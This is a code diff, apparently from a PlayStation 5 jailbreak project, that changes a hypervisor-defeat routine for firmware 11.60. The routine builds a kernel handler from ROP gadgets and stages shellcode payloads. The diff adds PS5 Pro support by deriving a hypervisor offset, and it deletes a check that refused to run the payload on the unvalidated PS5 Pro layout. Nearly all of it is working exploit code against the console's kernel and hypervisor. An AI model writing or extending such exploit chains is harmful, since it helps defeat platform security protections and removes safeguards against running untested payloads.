@@ -2,6 +2,7 @@
 #include "../shellcode_break_hv/break_hv.h"
 #include "../shellcode_break_hv/break_hv_params.h"
 #include "config.h"
+#include "hv_defeat_13xx.h"
 #include "loader_staging_1160.h"
 #include "utils.h"
 #include <machine/segments.h>
@@ -27,7 +28,6 @@
 #define FW_1120_RAW 0x11200005U
 #define FW_1140_RAW 0x11400005U
 #define FW_1160_RAW 0x11600005U
-#define PS5_PRO_SOC_ID 0x840fd0
 #define NCPU 16
 #define TSS_STRIDE 0x68ULL
 #define TSS_IST(ist) (0x24ULL + ((uint64_t)((ist) - 1) * 8ULL))
@@ -45,7 +45,6 @@
 
 #define AP_PAYLOAD_PAGE 0x3ffff000ULL
 #define AP_COPY_SIZE 0x800ULL
-#define HV_LOADER_PA_REGULAR 0x62800000ULL
 
 #define CAVE_ORACLE_OFF 0x440ULL
 #define CAVE_ARM_OFF 0x1000ULL
@@ -308,6 +307,14 @@ static int build_handler(uint8_t *handler, uint64_t handler_va,
   uint64_t oracle = resume_cave + CAVE_ORACLE_OFF;
   size_t save_addr_off, restore_rdi_off;
   size_t off = STACK_TOP_OFF;
+  uint64_t hv_offset = 0;
+
+  if (linux_i.kit_type == KIT_RETAIL_PRO) {
+    uint64_t hv_region = derive_h();
+    if (!hv_region)
+      return -1;
+    hv_offset = hv_region + HV_CODE_OFFSET_PRO - HV_BASE_REGULAR;
+  }
 
   memset(handler, 0, 0x400);
   memcpy(handler + IRET_OFF, &(uint64_t){kg(env_offset.GAD_IRETQ)}, 8);
@@ -344,7 +351,7 @@ static int build_handler(uint8_t *handler, uint64_t handler_va,
   STORE_PARAM(0xf00, kg(env_offset.MP_STARTUP_INIT_VECTOR));
   STORE_PARAM(0xf08, dmap);
   STORE_PARAM(0xf10, oracle);
-  STORE_PARAM(0xf18, HV_LOADER_PA_REGULAR);
+  STORE_PARAM(0xf18, hv_offset);
   STORE_PARAM(0xf20, resume_cave + CAVE_STASH_OFF);
   STORE_PARAM(0xf28, payload_va);
   STORE_PARAM(0xf30, kernel_cr3);
@@ -548,10 +555,6 @@ int hv_defeat_1160(void *shellcode_kernel, size_t shellcode_kernel_len) {
 
   if (shellcode_kernel == NULL || !offsets_present()) {
     notify("11.60 offsets/raw firmware gate failed; refusing to arm\n");
-    return -1;
-  }
-  if (sceKernelGetMainSocId() == PS5_PRO_SOC_ID) {
-    notify("11.60 AP payload refused on unvalidated PS5 Pro layout\n");
     return -1;
   }
   if (validate_wake_cave(shellcode_kernel_len)) {
